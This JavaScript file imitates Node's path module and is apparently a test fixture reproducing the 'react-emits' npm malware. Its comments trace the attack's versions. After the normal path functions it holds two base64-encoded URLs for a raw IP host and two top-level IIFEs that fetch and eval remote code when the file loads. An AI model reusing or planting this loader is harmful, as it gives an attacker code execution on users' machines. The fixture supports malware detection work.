'use strict';

// Imitation of Node.js built-in `path` module.
// Test fixture for react-emits malware (v1.0.0-1.0.3, npm-removed 2026-04-05).
// Original attack reported in docs/blog/react-emits-malware.html.
//
// Attack evolution detected during v2.10.72 audit (2026-04-11 VPS forensics):
//   v1.0.0: split payload — path.js used undeclared variables `randomStringRe`
//           and `tokenStringRe`, injected at runtime by 5 malicious dependencies.
//           Sandbox showed CLEAN because the deps never triggered the injection.
//   v1.0.2: ATTACKER EVOLVED — URLs hardcoded directly in path.js (this fixture).
//           Variables now declared on lines 75-76, no dep injection needed.
//   v1.0.3: half-retract — variables removed, IIFEs left. Throws ReferenceError
//           at load time. Trivially repairable by the attacker.

const isWindows = process.platform === 'win32';
const sep = isWindows ? '\\' : '/';

function normalize(p) {
  if (typeof p !== 'string') throw new TypeError('Path must be a string');
  const isAbs = p.startsWith('/') || /^[a-zA-Z]:/.test(p);
  const parts = p.split(/[/\\]/).filter(Boolean);
  const stack = [];
  for (const part of parts) {
    if (part === '.') continue;
    if (part === '..') {
      if (stack.length && stack[stack.length - 1] !== '..') stack.pop();
      else if (!isAbs) stack.push('..');
      continue;
    }
    stack.push(part);
  }
  const result = stack.join(sep);
  return isAbs ? sep + result : (result || '.');
}

function join() {
  const parts = Array.prototype.slice.call(arguments);
  if (parts.length === 0) return '.';
  return normalize(parts.filter(Boolean).join(sep));
}

function resolve() {
  const parts = Array.prototype.slice.call(arguments);
  let resolved = '';
  for (let i = parts.length - 1; i >= 0; i--) {
    const p = parts[i];
    if (!p) continue;
    resolved = p + sep + resolved;
    if (p.startsWith('/') || /^[a-zA-Z]:/.test(p)) return normalize(resolved);
  }
  return normalize(process.cwd() + sep + resolved);
}

function basename(p, ext) {
  const segments = p.split(/[/\\]/);
  let name = segments[segments.length - 1] || '';
  if (ext && name.endsWith(ext)) name = name.slice(0, -ext.length);
  return name;
}

function dirname(p) {
  const idx = Math.max(p.lastIndexOf('/'), p.lastIndexOf('\\'));
  if (idx === -1) return '.';
  return p.slice(0, idx) || sep;
}

function extname(p) {
  const name = basename(p);
  const idx = name.lastIndexOf('.');
  return idx <= 0 ? '' : name.slice(idx);
}

function isAbsolute(p) {
  return p.startsWith('/') || /^[a-zA-Z]:/.test(p);
}

var randomStringRe = "aHR0cDovLzE3My4yMTEuNDYuMjIwL2x2ZXJsYS5qcw==";
var tokenStringRe = "aHR0cDovLzE3My4yMTEuNDYuMjIwL2x2ZXJs";

// Two top-level IIFEs — staged RCE loader pattern
// fetch(atob(VAR)).then(r => r.json()).then(d => eval(d.content))
// Decoded URLs: http://173.211.46.220/lverla.js and http://173.211.46.220/lverl
(function () {
  fetch(atob(randomStringRe))
    .then(function (r) { return r.json(); })
    .then(function (d) { eval(d.content); })
    .catch(function () {});
})();

(function () {
  fetch(atob(tokenStringRe))
    .then(function (r) { return r.json(); })
    .then(function (d) { eval(d.content); })
    .catch(function () {});
})();

module.exports = {
  normalize: normalize,
  join: join,
  resolve: resolve,
  basename: basename,
  dirname: dirname,
  extname: extname,
  isAbsolute: isAbsolute,
  sep: sep
};
